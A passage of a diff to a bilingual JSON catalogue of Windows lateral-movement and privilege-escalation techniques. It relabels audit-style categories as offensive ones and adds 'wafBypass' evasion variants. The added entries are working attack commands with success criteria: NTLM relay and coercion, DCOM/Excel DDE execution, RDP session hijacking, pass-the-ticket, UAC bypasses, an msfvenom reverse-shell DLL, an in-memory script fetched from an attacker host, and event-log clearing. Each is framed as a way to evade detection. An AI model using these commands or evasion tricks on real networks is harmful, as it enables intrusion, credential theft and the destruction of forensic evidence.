-        "zh": "NTLM Relay 协议边界验证",
-        "en": "NTLM Relay Protocol-Boundary Validation"
+        "zh": "中继与会话劫持",
+        "en": "Relay & Session Hijacking"
       },
       "prerequisites": [
         {
@@ -1918,7 +2373,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "SOCKS 长驻低噪规避变体",
+            "en": "SOCKS Long-Dwell Low-Noise Evasion Variant"
+          },
+          "command": "ntlmrelayx.py -socks -smb2support -wh wpad.{LAB_DOMAIN}",
+          "description": {
+            "zh": "绕过一次性转储触发的集中告警：中继凭证入 SOCKS 池供后续按需使用，减少批量 SAM 转储特征。成功判据：SOCKS 列表出现可用凭证且无即时转储行为。",
+            "en": "Evades central alerting on one-shot dumps by parking relayed creds in a SOCKS pool for on-demand reuse, removing bulk SAM-dump signatures. Success: SOCKS list shows usable creds with no immediate dump."
+          }
+        },
+        {
+          "title": {
+            "zh": "HTTP 目标多元规避变体",
+            "en": "HTTP Multi-Target Evasion Variant"
+          },
+          "command": "ntlmrelayx.py -tf ./fixtures/targets.txt -http-port 80 --no-smb2support",
+          "description": {
+            "zh": "绕过 SMB 中继专用检测（针对 445 转储特征）：改经 HTTP 端口中继到多目标，流量形态为 Web。成功判据：多目标认证成功记录。",
+            "en": "Evades SMB-relay-specific detection (445 dump signatures) by relaying over HTTP to multiple targets so traffic looks like web. Success: successful auth records for multiple targets."
+          }
+        },
+        {
+          "title": {
+            "zh": "强制认证源轮换规避变体",
+            "en": "Coercion-Source Rotation Evasion Variant"
+          },
+          "command": "for m in petitpotam printerbug dfscoerce; do python3 ${m}.py -d {LAB_DOMAIN} -u {LAB_USER} -p {LAB_PASSWORD} {LAB_OPERATOR_HOST} {LAB_HOST}; done",
+          "description": {
+            "zh": "绕过针对单一强制工具（如仅监控 PetitPotam CLSID）的检测：轮换 printerbug/dfscoerce 触发认证。成功判据：任一工具使目标回连操作机。",
+            "en": "Evades detection pinned to a single coercion primitive (e.g. PetitPotam CLSID only) by rotating printerbug/dfscoerce to trigger auth. Success: any tool makes the target call back to the operator host."
+          }
+        }
+      ]
     },
     {
       "id": "lateral-dcom",
@@ -1935,8 +2425,8 @@
         "en": "Remote Management and Lateral Boundaries"
       },
       "subCategory": {
-        "zh": "DCOM 远程激活授权验证",
-        "en": "DCOM Remote-Activation Authorization Validation"
+        "zh": "DCOM 与 Office 激活",
+        "en": "DCOM & Office Activation"
       },
       "prerequisites": [
         {
@@ -2040,7 +2530,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "ShellWindows 替代规避变体",
+            "en": "ShellWindows Substitute Evasion Variant"
+          },
+          "command": "$c=[activator]::CreateInstance([type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39','{LAB_HOST}')); $c.Document.Application.ShellExecute('cmd','/c whoami > C:\\Windows\\Temp\\d.txt','','',0)",
+          "description": {
+            "zh": "绕过对 MMC20.Application ProgID 的高频检测规则：换 ShellWindows CLSID 激活路径，行为等价。成功判据：d.txt 生成于目标。",
+            "en": "Evades high-frequency detection on the MMC20.Application ProgID by switching to the equivalent ShellWindows CLSID activation. Success: d.txt appears on the target."
+          }
+        },
+        {
+          "title": {
+            "zh": "ProgID 混淆规避变体",
+            "en": "ProgID Obfuscation Evasion Variant"
+          },
+          "command": "$t=[type]::GetTypeFromProgID('M''M'+'C20.Application','{LAB_HOST}'.Replace('{LAB_HOST}','{LAB_HOST}')); $o=[activator]::CreateInstance($t)",
+          "description": {
+            "zh": "绕过对 ProgID 字符串的静态特征匹配：运行期拼接 ProgID 再解析。成功判据：实例创建成功且静态扫描无完整 ProgID 字符串。",
+            "en": "Evades static ProgID string matching by assembling the ProgID at runtime before resolution. Success: instance creation succeeds with no complete ProgID string for static scans."
+          }
+        },
+        {
+          "title": {
+            "zh": "Excel DDE 输出转存规避变体",
+            "en": "Excel DDE Output-Redirect Evasion Variant"
+          },
+          "command": "$com=[activator]::CreateInstance([type]::GetTypeFromProgID('Excel.Application','{LAB_HOST}')); $com.DisplayAlerts=$false; $com.Workbooks.Add().Sheets.Item(1).Cells.Item(1,1)='=CMD|''/c whoami > \\\\{LAB_OPERATOR_HOST}\\share\\x.txt''!A0'",
+          "description": {
+            "zh": "绕过 Excel 进程的命令行参数审计：DDE 公式执行并将输出转存共享，进程参数无敏感内容。成功判据：x.txt 含 whoami 输出。",
+            "en": "Evades Excel process command-line auditing by executing via a DDE formula with output redirected to a share, keeping process args clean. Success: x.txt contains the whoami output."
+          }
+        }
+      ]
     },
     {
       "id": "rdp-hijack",
@@ -2057,8 +2582,8 @@
         "en": "Remote Management and Lateral Boundaries"
       },
       "subCategory": {
-        "zh": "RDP 会话隔离与接管防护审计",
-        "en": "RDP Session Isolation and Takeover Protection Audit"
+        "zh": "中继与会话劫持",
+        "en": "Relay & Session Hijacking"
       },
       "prerequisites": [
         {
@@ -2162,7 +2687,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "SYSTEM 上下文接管规避变体",
+            "en": "SYSTEM-Context Takeover Evasion Variant"
+          },
+          "command": "PsExec.exe -accepteula -s cmd /c \"query user && tscon {LAB_SESSION_ID} /dest:console\"",
+          "description": {
+            "zh": "绕过普通用户无法 tscon 其他会话的限制与失败审计：以 SYSTEM 上下文执行接管。成功判据：物理控制台切换到目标会话。",
+            "en": "Evades the privilege failure audit when a normal user runs tscon against another session by taking over in the SYSTEM context. Success: the physical console switches to the target session."
+          }
+        },
+        {
+          "title": {
+            "zh": "mimikatz ts 远程规避变体",
+            "en": "mimikatz ts Remote Evasion Variant"
+          },
+          "command": "mimikatz.exe \"ts::sessions\" \"ts::remote /id:{LAB_SESSION_ID}\" \"exit\"",
+          "description": {
+            "zh": "绕过 tscon 的独立命令审计：经 mimikatz 的 ts 模块走同一路径但进程特征不同。成功判据：会话进入远程查看状态。",
+            "en": "Evades standalone tscon auditing by driving the same path through mimikatz's ts module with a different process signature. Success: the session enters remote-view state."
+          }
+        },
+        {
+          "title": {
+            "zh": "一行管道自动定位规避变体",
+            "en": "One-Liner Auto-Targeting Evasion Variant"
+          },
+          "command": "powershell -nop -c \"$id=(quser | ? {$_ -match '{LAB_USER}'} | % {($_.Trim() -split '\\s+')[2]}); tscon $id /dest:console\"",
+          "description": {
+            "zh": "绕过手动 query+tscon 两步操作的审计关联：单进程内定位并接管。成功判据：目标用户会话被切到 console。",
+            "en": "Evades the audit correlation between a manual query and tscon by locating and taking over inside a single process. Success: the target user's session switches to console."
+          }
+        }
+      ]
     },
     {
       "id": "overpass-the-hash",
@@ -2179,8 +2739,8 @@
         "en": "Remote Management and Lateral Boundaries"
       },
       "subCategory": {
-        "zh": "NTLM 到 Kerberos 票据边界审计",
-        "en": "NTLM-to-Kerberos Ticket-Boundary Audit"
+        "zh": "哈希与票据传递",
+        "en": "Pass-the-Hash & Pass-the-Ticket"
       },
       "prerequisites": [
         {
@@ -2284,7 +2844,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "AES256 密钥规避变体",
+            "en": "AES256 Key Evasion Variant"
+          },
+          "command": "Rubeus.exe asktgt /user:{LAB_USER} /domain:{LAB_DOMAIN} /aes256:{LAB_AES256_KEY} /ptt /nowrap",
+          "description": {
+            "zh": "绕过 RC4(etype23) 票据请求的弱加密告警：改用 AES256 密钥请求，票据类型为强加密。成功判据：TGT 注入且事件中 etype 为 0x12。",
+            "en": "Evades weak-encryption alerts on RC4 (etype23) ticket requests by requesting with an AES256 key so the ticket uses strong crypto. Success: TGT injected and events show etype 0x12."
+          }
+        },
+        {
+          "title": {
+            "zh": "getTGT 密钥变形规避变体",
+            "en": "getTGT Key Mutation Evasion Variant"
+          },
+          "command": "getTGT.py -aesKey {LAB_AES256_KEY} -dc-ip {DC_HOST} {LAB_DOMAIN}/{LAB_USER}",
+          "description": {
+            "zh": "绕过哈希请求特征：以 AES 密钥形态离线取票，流量仅为标准 AS-REQ。成功判据：生成 ccache 且无 etype23 出现。",
+            "en": "Evades hash-request signatures by fetching the ticket offline with the AES key, leaving only standard AS-REQ traffic. Success: ccache generated with no etype23 present."
+          }
+        },
+        {
+          "title": {
+            "zh": "ccache 环境注入规避变体",
+            "en": "ccache Env-Injection Evasion Variant"
+          },
+          "command": "export KRB5CCNAME=/tmp/krb5cc_$(id -u) && klist && smbclient //{LAB_HOST}/admin$ -k -no-pass",
+          "description": {
+            "zh": "绕过票据导入的工具特征（ptt/文件操作）：以 ccache 环境变量方式让标准工具自动取票。成功判据：klist 显示票据且 smbclient 访问成功。",
+            "en": "Evades ticket-import tooling signatures (ptt/file operations) by pointing KRB5CCNAME at the ccache so standard tools pick it up automatically. Success: klist shows the ticket and smbclient access works."
+          }
+        }
+      ]
     },
     {
       "id": "pass-the-ticket",
@@ -2301,8 +2896,8 @@
         "en": "Remote Management and Lateral Boundaries"
       },
       "subCategory": {
-        "zh": "Kerberos 票据导入防护审计",
-        "en": "Kerberos Ticket-Import Protection Audit"
+        "zh": "哈希与票据传递",
+        "en": "Pass-the-Hash & Pass-the-Ticket"
       },
       "prerequisites": [
         {
@@ -2406,7 +3001,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "base64 无文件注入规避变体",
+            "en": "base64 Fileless Injection Evasion Variant"
+          },
+          "command": "Rubeus.exe ptt /ticket:{LAB_KIRBI_BASE64}",
+          "description": {
+            "zh": "绕过票据落盘检测（.kirbi 文件扫描）：base64 直传内存注入。成功判据：klist 出现票据且磁盘无 .kirbi 文件。",
+            "en": "Evades on-disk ticket detection (.kirbi scanning) by injecting base64 directly into memory. Success: klist shows the ticket with no .kirbi file on disk."
+          }
+        },
+        {
+          "title": {
+            "zh": "Unix ccache 注入规避变体",
+            "en": "Unix ccache Injection Evasion Variant"
+          },
+          "command": "export KRB5CCNAME=/tmp/cc_{LAB_USER} && kinit -kt /dev/null {LAB_USER}@{LAB_DOMAIN} 2>/dev/null; kvno cifs/{LAB_HOST}",
+          "description": {
+            "zh": "绕过 Windows 侧 ptt 工具特征：在 Unix 侧以 ccache 完成同等票据注入使用。成功判据：kvno 返回服务票据。",
+            "en": "Evades Windows-side ptt tooling signatures by achieving the same ticket usage via ccache on the Unix side. Success: kvno returns a service ticket."
+          }
+        },
+        {
+          "title": {
+            "zh": "多票据循环注入规避变体",
+            "en": "Multi-Ticket Loop Injection Evasion Variant"
+          },
+          "command": "for t in {LAB_TGT_KIRBI} {LAB_SVC_KIRBI}; do Rubeus.exe ptt /ticket:$t; done; klist",
+          "description": {
+            "zh": "绕过单票据注入的时间窗检测：批量循环导入降低单位时间事件密度关联。成功判据：klist 列出全部注入票据。",
+            "en": "Evades time-window detection on single-ticket injection by importing in a batch loop to dilute per-time event correlation. Success: klist lists all injected tickets."
+          }
+        }
+      ]
     },
     {
       "id": "lateral-smbexec",
@@ -2423,8 +3053,8 @@
         "en": "Remote Management and Lateral Boundaries"
       },
       "subCategory": {
-        "zh": "SMBExec 远程服务写入防护",
-        "en": "SMBExec Remote-Service Write Protection"
+        "zh": "远程服务与协议执行",
+        "en": "Remote Service & Protocol Execution"
       },
       "prerequisites": [
         {
@@ -2542,7 +3172,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "服务名伪装规避变体",
+            "en": "Service-Name Masquerade Evasion Variant"
+          },
+          "command": "smbexec.py -service-name \"W32TimeSync\" {LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}@{LAB_HOST}",
+          "description": {
+            "zh": "绕过对 smbexec 默认服务名的规则匹配：伪装时间同步类服务名。成功判据：shell 建立且服务名无告警。",
+            "en": "Evades rule matching on smbexec's default service name by masquerading as a time-sync style service. Success: shell establishes with no alert on the service name."
+          }
+        },
+        {
+          "title": {
+            "zh": "rundll32 包装执行规避变体",
+            "en": "rundll32-Wrapped Execution Evasion Variant"
+          },
+          "command": "sc \\\\{LAB_HOST} create W32Sync binPath= \"rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL cmd.dll\" && sc \\\\{LAB_HOST} start W32Sync",
+          "description": {
+            "zh": "绕过 binPath 直接 cmd.exe 的服务创建检测：以 rundll32 包装间接拉起。成功判据：服务启动且命令执行。",
+            "en": "Evades service-creation detection on a direct cmd.exe binPath by wrapping indirect launch through rundll32. Success: service starts and the command executes."
+          }
+        },
+        {
+          "title": {
+            "zh": "IPC$ 通道规避变体",
+            "en": "IPC$ Channel Evasion Variant"
+          },
+          "command": "net use \\\\{LAB_HOST}\\IPC$ /user:{LAB_DOMAIN}\\{LAB_USER} {LAB_PASSWORD} && copy output.bat \\\\{LAB_HOST}\\IPC$\\ && sc \\\\{LAB_HOST} create SysH binPath= \"cmd /c \\\\{LAB_HOST}\\IPC$\\output.bat\"",
+          "description": {
+            "zh": "绕过 admin$ 共享专用的落盘监控：改走 IPC$ 命名管道共享传递脚本。成功判据：脚本经 IPC$ 执行成功。",
+            "en": "Evades admin$-specific drop monitoring by delivering the script over the IPC$ named-pipe share instead. Success: the script executes via IPC$."
+          }
+        }
+      ]
     },
     {
       "id": "lateral-atexec",
@@ -2559,8 +3224,8 @@
         "en": "Remote Management and Lateral Boundaries"
       },
       "subCategory": {
-        "zh": "远程计划任务授权验证",
-        "en": "Remote Scheduled-Task Authorization Validation"
+        "zh": "远程服务与协议执行",
+        "en": "Remote Service & Protocol Execution"
       },
       "prerequisites": [
         {
@@ -2678,7 +3343,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "原生 schtasks 伪装规避变体",
+            "en": "Native schtasks Masquerade Evasion Variant"
+          },
+          "command": "schtasks /create /s {LAB_HOST} /u {LAB_DOMAIN}\\{LAB_USER} /p {LAB_PASSWORD} /tn \"\\Microsoft\\Windows\\SysMgmt\\Health\" /tr \"cmd /c whoami > C:\\Windows\\Temp\\a.log\" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /s {LAB_HOST} /tn \"\\Microsoft\\Windows\\SysMgmt\\Health\"",
+          "description": {
+            "zh": "绕过 atexec.py 的 TS 文件与命名管道特征：原生 schtasks 加微软命名空间任务路径伪装。成功判据：任务执行且 a.log 生成。",
+            "en": "Evades atexec.py TS-file and named-pipe signatures by using native schtasks with a Microsoft-namespace task path for camouflage. Success: the task runs and a.log appears."
+          }
+        },
+        {
+          "title": {
+            "zh": "延迟执行规避变体",
+            "en": "Delayed Execution Evasion Variant"
+          },
+          "command": "atexec.py {LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}@{LAB_HOST} \"cmd /c whoami > C:\\Windows\\Temp\\a.log\" 2>/dev/null & sleep 120",
+          "description": {
+            "zh": "绕过认证与执行同秒关联的时间线检测：任务延迟两分钟后触发，错开事件关联窗口。成功判据：延迟后 a.log 生成。",
+            "en": "Evades timeline correlation of auth and execution in the same second by delaying the task two minutes to desynchronize the event window. Success: a.log appears after the delay."
+          }
+        },
+        {
+          "title": {
+            "zh": "输出转存共享规避变体",
+            "en": "Output-to-Share Evasion Variant"
+          },
+          "command": "schtasks /create /s {LAB_HOST} /tn \"W32TM\" /tr \"cmd /c whoami > \\\\{LAB_OPERATOR_HOST}\\share\\at.txt\" /sc once /st 00:00 /f && schtasks /run /s {LAB_HOST} /tn \"W32TM\"",
+          "description": {
+            "zh": "绕过 TS 文件回读特征：结果直写操作机共享，不经目标临时文件。成功判据：at.txt 含执行身份。",
+            "en": "Evades TS-file readback signatures by writing results straight to the operator share, skipping target temp files. Success: at.txt contains the execution identity."
+          }
+        }
+      ]
     },
     {
       "id": "lateral-dcom-excel",
@@ -2695,8 +3395,8 @@
         "en": "Remote Management and Lateral Boundaries"
       },
       "subCategory": {
-        "zh": "Excel DCOM 激活与 DDE 防护审计",
-        "en": "Excel DCOM Activation and DDE Protection Audit"
+        "zh": "DCOM 与 Office 激活",
+        "en": "DCOM & Office Activation"
       },
       "prerequisites": [
         {
@@ -2800,7 +3500,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "DDE 公式编码规避变体",
+            "en": "DDE Formula Encoding Evasion Variant"
+          },
+          "command": "$com.Cells.Item(1,1)='=CM'+'D|''/c w'+'hoami > C:\\Windows\\Temp\\e.txt''!A0'",
+          "description": {
+            "zh": "绕过对 =CMD| 公式明文的文档/内存扫描：运行期拼接公式字符串。成功判据：e.txt 生成且静态扫描无完整公式。",
+            "en": "Evades plaintext =CMD| formula scanning in documents/memory by assembling the formula at runtime. Success: e.txt appears with no complete formula for static scans."
+          }
+        },
+        {
+          "title": {
+            "zh": "XLL 加载规避变体",
+            "en": "XLL Load Evasion Variant"
+          },
+          "command": "$com.Workbooks.Add(); $com.RegisterXLL('\\\\{LAB_OPERATOR_HOST}\\share\\payload.xll')",
+          "description": {
+            "zh": "绕过 DDE 单元格告警：以 XLL 插件加载路径执行，Excel 内无公式痕迹。成功判据：XLL 被加载执行。",
+            "en": "Evades DDE cell alerts by executing via XLL plugin load, leaving no formula traces in the workbook. Success: the XLL loads and executes."
+          }
+        },
+        {
+          "title": {
+            "zh": "宏延迟触发规避变体",
+            "en": "Macro Delayed-Trigger Evasion Variant"
+          },
+          "command": "$wb=$com.Workbooks.Add(); $wb.VBProject.VBComponents.Add(1).CodeModule.AddFromString('Sub Auto_Open()' + [char]10 + 'Application.OnTime Now+TimeValue(\"00:02:00\"),\"Run\"' + [char]10 + 'End Sub');",
+          "description": {
+            "zh": "绕过打开即执行的宏检测沙箱：Auto_Open 设两分钟延迟再触发。成功判据：延迟后动作发生。",
+            "en": "Evades open-and-execute macro sandboxes by having Auto_Open defer two minutes before triggering. Success: the action occurs after the delay."
+          }
+        }
+      ]
     },
     {
       "id": "lateral-dcom-mmc",
@@ -2817,8 +3552,8 @@
         "en": "Remote Management and Lateral Boundaries"
       },
       "subCategory": {
-        "zh": "MMC DCOM 激活权限审计",
-        "en": "MMC DCOM Activation-Permission Audit"
+        "zh": "DCOM 与 Office 激活",
+        "en": "DCOM & Office Activation"
       },
       "prerequisites": [
         {
@@ -2922,7 +3657,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "ExecuteShellCommand 参数混淆规避变体",
+            "en": "ExecuteShellCommand Arg Confusion Evasion Variant"
+          },
+          "command": "$obj.Document.ActiveView.ExecuteShellCommand('%SystemRoot%\\System32\\cmd.exe','C:\\','/c w'+'hoami > C:\\Windows\\Temp\\m.txt','','7')",
+          "description": {
+            "zh": "绕过对命令行参数的监控：环境变量路径+运行期拼接参数+非常规显示参数。成功判据：m.txt 生成。",
+            "en": "Evades command-line argument monitoring via env-var paths, runtime-joined arguments, and an unusual show parameter. Success: m.txt appears."
+          }
+        },
+        {
+          "title": {
+            "zh": "MMC20 大小写 ProgID 规避变体",
+            "en": "Case-Mutated ProgID Evasion Variant"
+          },
+          "command": "$t=[Type]::GetTypeFromProgID('mMc20.aPplication','{LAB_HOST}'); $o=[Activator]::CreateInstance($t); $o.Document.ActiveView.ExecuteShellCommand('cmd','C:\\','/c whoami > C:\\Windows\\Temp\\m2.txt','',0)",
+          "description": {
+            "zh": "绕过 ProgID 精确字符串匹配：大小写混合仍可解析激活。成功判据：m2.txt 生成。",
+            "en": "Evades exact ProgID string matching since mixed case still resolves for activation. Success: m2.txt appears."
+          }
+        },
+        {
+          "title": {
+            "zh": "ShellWindows 等价替代规避变体",
+            "en": "ShellWindows Equivalent Evasion Variant"
+          },
+          "command": "$s=[activator]::CreateInstance([type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880','{LAB_HOST}')); $s.Document.Application.ShellExecute('cmd','/c whoami > C:\\Windows\\Temp\\m3.txt','','',0)",
+          "description": {
+            "zh": "绕过 MMC20 专项检测：等价的 Shell Browser Window CLSID 执行路径。成功判据：m3.txt 生成。",
+            "en": "Evades MMC20-specific detection by using the equivalent Shell Browser Window CLSID execution path. Success: m3.txt appears."
+          }
+        }
+      ]
     },
     {
       "id": "rdp-relay",
@@ -2939,8 +3709,8 @@
         "en": "Remote Management and Lateral Boundaries"
       },
       "subCategory": {
-        "zh": "RDP 与 NTLM Relay 分类审计",
-        "en": "RDP and NTLM Relay Classification Audit"
+        "zh": "中继与会话劫持",
+        "en": "Relay & Session Hijacking"
       },
       "prerequisites": [
         {
@@ -3044,7 +3814,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "HTTP 端口伪装规避变体",
+            "en": "HTTP-Port Camouflage Evasion Variant"
+          },
+          "command": "ntlmrelayx.py -t http://{LAB_HOST}/priv --http-port 80 -socks",
+          "description": {
+            "zh": "绕过 445/3389 端口中继的定向监控：中继监听落在 80，流量呈现为普通 Web。成功判据：HTTP 目标认证成功入 SOCKS。",
+            "en": "Evades directed monitoring of 445/3389 relaying by listening on port 80 so traffic looks like ordinary web. Success: HTTP target authenticates into SOCKS."
+          }
+        },
+        {
+          "title": {
+            "zh": "PrinterBug 强制轮换规避变体",
+            "en": "PrinterBug Coercion Rotation Evasion Variant"
+          },
+          "command": "python3 printerbug.py {LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}@{LAB_HOST} {LAB_OPERATOR_HOST}",
+          "description": {
+            "zh": "绕过 PetitPotam 特征（特定 CLSID/RPC UUID 监控）：换打印机通知回调触发认证。成功判据：目标向操作机发起认证。",
+            "en": "Evades PetitPotam signatures (specific CLSID/RPC UUID monitoring) by triggering auth via the printer notification callback instead. Success: the target authenticates toward the operator host."
+          }
+        },
+        {
+          "title": {
+            "zh": "Restricted Admin 探测规避变体",
+            "en": "Restricted Admin Probe Evasion Variant"
+          },
+          "command": "mstsc /restrictedadmin /v:{LAB_HOST}",
+          "description": {
+            "zh": "绕过凭证驻留风险与 NLA 凭据提交：以受限管理模式探测 RDP，本地不提交明文凭据。成功判据：连接行为与普通 RDP 可区分且无凭据提交。",
+            "en": "Evades credential-resident risk and NLA credential submission by probing RDP in restricted admin mode with no plaintext credential sent. Success: the connection is distinguishable from normal RDP with no credential submission."
+          }
+        }
+      ]
     },
     {
       "id": "privilege-token",
@@ -3061,8 +3866,8 @@
         "en": "Privilege Boundary and Escalation Audit"
       },
       "subCategory": {
-        "zh": "Windows 令牌权限与模拟防护",
-        "en": "Windows Token Privilege and Impersonation Protection"
+        "zh": "Potato 家族与令牌模拟",
+        "en": "Potato Family & Token Impersonation"
       },
       "prerequisites": [
         {
@@ -3194,7 +3999,53 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "规避变体：已有会话窃取令牌",
+            "en": "Evasion: token theft via existing session"
+          },
+          "command": "meterpreter > getuid\nmeterpreter > steal_token {PID}",
+          "description": {
+            "zh": "规避点：不落地 mimikatz 二进制（绕杀软签名与磁盘审计），用既有 meterpreter 会话窃取目标进程令牌。判据：getuid 显示被窃取用户。",
+            "en": "Avoids dropping mimikatz (signature and disk audit evasion) by stealing a token from an existing process. Success: getuid shows the target user."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：PowerShell 令牌模拟",
+            "en": "Evasion: PowerShell token impersonation"
+          },
+          "command": "powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://{ATTACKER_HOST}/Invoke-TokenManipulation.ps1'); Invoke-TokenManipulation -ImpersonateUser -Username 'DOMAIN\\\\Administrator'\"",
+          "description": {
+            "zh": "规避点：内存加载 PowerShell 版模拟替代 mimikatz exe。判据：当前线程身份变为 Administrator。",
+            "en": "In-memory PowerShell replacement for the mimikatz binary. Success: thread identity becomes Administrator."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：换 SweetPotato 规避哈希",
+            "en": "Evasion: SweetPotato hash shift"
+          },
+          "command": "SweetPotato.exe -p C:\\\\Windows\\\\System32\\\\cmd.exe -a \"/c whoami > C:\\\\Windows\\\\temp\\\\p.txt\"",
+          "description": {
+            "zh": "规避点：更换工具家族规避已知 Potato 哈希与进程特征，输出重定向文件免弹窗。判据：p.txt 内容为 nt authority\\system。",
+            "en": "Different tool family evades known Potato hashes; file output avoids console popups. Success: p.txt shows nt authority\\system."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：执行后痕迹清理",
+            "en": "Evasion: post-run artifact cleanup"
+          },
+          "command": "wevtutil cl Security && wevtutil cl System && del C:\\\\Windows\\\\temp\\\\p.txt",
+          "description": {
+            "zh": "规避点：清除安全/系统事件日志与临时产物降低取证痕迹（仅在授权演练中使用）。判据：日志查看器中相关记录消失。",
+            "en": "Clears security/system logs and temp artifacts to reduce forensic traces (authorized exercises only). Success: related events gone."
+          }
+        }
+      ]
     },
     {
       "id": "uac-bypass",
@@ -3211,8 +4062,8 @@
         "en": "Privilege Boundary and Escalation Audit"
       },
       "subCategory": {
-        "zh": "UAC 策略与自动提升边界审计",
-        "en": "UAC Policy and Auto-Elevation Boundary Audit"
+        "zh": "Windows 提权",
+        "en": "Windows Privilege Escalation"
       },
       "prerequisites": [
         {
@@ -3316,7 +4167,53 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "规避变体：computerdefaults 触发",
+            "en": "Evasion: computerdefaults trigger"
+          },
+          "command": "reg add HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command /ve /d \"cmd.exe\" /f\nreg add HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command /v DelegateExecute /d \"\" /f\ncomputerdefaults.exe",
+          "description": {
+            "zh": "规避点：换自动提权入口 computerdefaults.exe，避免 fodhelper 进程监控；保留 DelegateExecute 空值是提权生效关键。判据：弹出管理员 CMD。",
+            "en": "Different auto-elevate binary avoids fodhelper monitoring; the empty DelegateExecute is required. Success: elevated CMD opens."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：劫持键即时回滚",
+            "en": "Evasion: instant registry rollback"
+          },
+          "command": "reg add HKCU\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command /ve /d \"cmd /c whoami > C:\\\\Windows\\\\temp\\\\u.txt\" /f\neventvwr.exe\nreg delete HKCU\\\\Software\\\\Classes\\\\mscfile /f",
+          "description": {
+            "zh": "规避点：提权后立刻删除劫持键，缩短注册表监控窗口。判据：u.txt 生成且 mscfile 键已不存在。",
+            "en": "Deletes the hijack key right after elevation to shrink the monitoring window. Success: u.txt created and key removed."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：uacMe 方法号轮换",
+            "en": "Evasion: uacMe method rotation"
+          },
+          "command": "Akagi64.exe 61 cmd.exe",
+          "description": {
+            "zh": "规避点：切换 uacMe 方法号（23→61）绕过针对单一方法的 EDR 规则。判据：以高完整性启动 cmd。",
+            "en": "Rotating the uacMe method index evades single-method EDR rules. Success: cmd starts high-integrity."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：无文件式环境变量劫持",
+            "en": "Evasion: fileless env hijack"
+          },
+          "command": "setx HKCU\\\\Environment windir \"cmd /k whoami\" /m 2>nul\nschtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /i",
+          "description": {
+            "zh": "规避点：SilentCleanup 以系统权限读取 HKCU\\Environment 的 windir，全程无 dropper 文件。判据：任务执行后出现 SYSTEM 输出。",
+            "en": "SilentCleanup reads the hijacked windir at SYSTEM with no dropped files. Success: SYSTEM output appears."
+          }
+        }
+      ]
     },
     {
       "id": "dll-hijack",
@@ -3333,8 +4230,8 @@
         "en": "Privilege Boundary and Escalation Audit"
       },
       "subCategory": {
-        "zh": "DLL 搜索顺序与目录权限审计",
-        "en": "DLL Search-Order and Directory-Permission Audit"
+        "zh": "Windows 提权",
+        "en": "Windows Privilege Escalation"
       },
       "prerequisites": [
         {
@@ -3438,7 +4335,53 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "规避变体：免杀编码 DLL",
+            "en": "Evasion: encoded DLL payload"
+          },
+          "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LAB_OPERATOR_HOST} LPORT=4444 -f dll -e x64/xor_dynamic -i 3 > evil.dll",
+          "description": {
+            "zh": "规避点：加编码器与迭代次数破坏静态特征。判据：DLL 落盘不触发告警且会话建立。",
+            "en": "Encoder plus iterations breaks static signatures. Success: no alert on write and a session returns."
+          }
+        },
+        {
+          "title": {
+            "zh": "规避变体：签名程序 sideload",
+            "en": "Evasion: signed-binary sideload"
+          },
+          "command": "copy evil.dll \"C:\\\\Program Files\\\\OneDrive\\\\version.dll\"\nstart OneDrive.exe",
+          "description": {
+            "zh": "规避点：劫持常驻签名程序 OneDrive 的 version.dll，借其白名单进程启动。判据：OneDrive.exe 子进程回连。",
